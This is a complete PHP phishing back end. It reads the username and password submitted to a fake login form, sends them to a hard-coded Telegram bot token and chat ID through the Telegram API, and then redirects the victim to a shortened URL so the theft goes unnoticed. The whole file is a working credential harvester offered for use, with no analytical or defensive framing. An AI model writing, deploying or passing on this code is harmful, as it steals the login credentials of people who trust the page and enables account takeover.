<?php
// Your Telegram bot API token and chat ID
$telegramBotToken = '6320093887:AAHbH3fgbyiYNK44WNfbs8jGQleql0ZdNFc';
$telegramChatID = '1054551712';

// Get the entered username and password
$username = $_POST['username'];
$password = $_POST['password'];

// Format the message to be sent to Telegram
$message = "𝘽𝙍𝙄𝘼𝙉𝙎 𝘿𝘼𝙏𝘼✅\nUsername: $username\nPassword: $password";

// Send the message to Telegram
$telegramURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
$telegramParams = [
    'chat_id' => $telegramChatID,
    'text' => $message
];

// Send an HTTP POST request to the Telegram API
$ch = curl_init($telegramURL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
curl_exec($ch);
curl_close($ch);


// Redirect the user to the desired URL
header("Location: https://shorturl.at/mL034");
exit;
?>
